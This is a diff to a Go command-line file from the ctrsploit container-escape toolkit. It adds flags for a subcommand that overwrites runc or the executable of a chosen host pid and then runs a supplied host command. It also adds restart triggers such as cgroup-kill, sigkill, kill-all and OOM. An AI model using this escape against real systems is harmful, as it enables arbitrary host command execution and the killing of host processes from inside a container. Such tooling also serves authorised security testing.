@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 
+	"github.com/ctrsploit/ctrsploit/pkg/crash"
 	"github.com/urfave/cli/v3"
 )
 
@@ -90,12 +91,18 @@ func Command(primitive Primitive, aliases []string, usage string) *cli.Command {
 						Flags: []cli.Flag{
 							&cli.IntFlag{Name: "pid",
 								Value: 1,
-								Usage: "pid whose executable should be overwritten and killed"},
+								Usage: "pid whose executable should be overwritten and restarted"},
 							&cli.StringFlag{Name: "cmd", Aliases: []string{"c"}, Required: true,
 								Usage: "host command to execute after runc is overwritten"},
+							&cli.StringFlag{Name: "restart-method",
+								Value: crash.MethodAuto,
+								Usage: "restart trigger methods: auto,all,cgroup-kill,sigkill,kill-all,oom (comma-separated)"},
+							&cli.DurationFlag{Name: "timeout",
+								Usage: "timeout for triggering restart; 0 means no timeout"},
 						},
 						Action: func(ctx context.Context, cmd *cli.Command) error {
-							return EscapeRestart(primitive, cmd.Int("pid"), ShellPayload(cmd.String("cmd")), 0)
+							methods := crash.ParseMethods(cmd.String("restart-method"))
+							return EscapeRestart(primitive, cmd.Int("pid"), ShellPayload(cmd.String("cmd")), cmd.Duration("timeout"), methods...)
 						},
 					},
 				},
